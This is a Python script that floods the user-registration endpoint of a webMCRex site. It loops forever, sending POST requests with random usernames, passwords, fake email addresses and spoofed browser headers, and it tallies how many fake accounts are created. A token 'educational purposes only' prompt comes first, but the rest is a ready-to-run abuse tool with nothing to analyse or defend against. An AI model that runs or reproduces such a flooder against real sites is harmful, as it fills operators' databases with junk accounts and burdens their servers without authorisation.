#!/usr/bin/env python3 

import requests
import random
import string

disclaimer_agreement = input('I have read disclaimer.text and will use this script for educational purposes only, without making harm to anybody, anywhere, anytime [N/y]: ')
if disclaimer_agreement not in ('y', 'Y'):
    exit('Sorry.')

print('Enter URL of the webMCRex site. Including protocol, but without slash on the end.')
print('Example: https://example.com')
URL = input('URL: ')
if URL == '' or URL[-1] == '/' or URL[0:4] != 'http':
    exit('IDIOT!')

# Stats
successful_requests = 0
failed_requests = 0

headers = {
    'Origin': URL,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/61.0.3163.79 Chrome/61.0.3163.79 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Referer': URL+'/?mode=start',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.8,ru;q=0.6'
}

def random_string():
    length = random.randint(5, 14)
    return ''.join([random.choice(string.ascii_lowercase + string.digits) for _ in range(length)])

def random_mail_provider():
    return random.choice(('mail.ru', 'bk.ru', 'gmail.com', 'yandex.ru', 'ya.ru', 'yahoo.com'))

# FLOOD!
while True:
    password = random_string()
    data = {
        'login': random_string(),
        'pass': password,
        'repass': password,
        'email': random_string() + '@' + random_mail_provider(),
        'female': random.choice((0, 1))
    }
    r = requests.post(URL + '/register.php', headers=headers, data=data)
    if r.status_code == 200:
        if '"code":0' in r.text:
            successful_requests += 1
    else:
        failed_requests += 1
        
    print('Success:', successful_requests, 'Failed:', failed_requests, end='\r')
